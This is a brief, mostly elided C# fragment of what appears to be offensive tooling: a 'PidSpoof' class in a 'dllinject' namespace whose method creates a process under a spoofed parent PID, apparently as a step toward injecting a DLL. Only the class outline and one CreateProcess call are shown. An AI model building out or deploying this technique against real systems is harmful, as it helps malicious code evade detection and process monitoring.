...
namespace dllinject
{
    public class PidSpoof
    {
        ...
        public IntPtr execute(uint ppid, string spawnto, string dllPath)
        {
            ...
            result1 = Kernel32.CreateProcess(spawnto, "", ref secAttr, ref secAttr, false, 0x00080010, IntPtr.Zero, currentPath, ref sInfoEx, out pInfo);
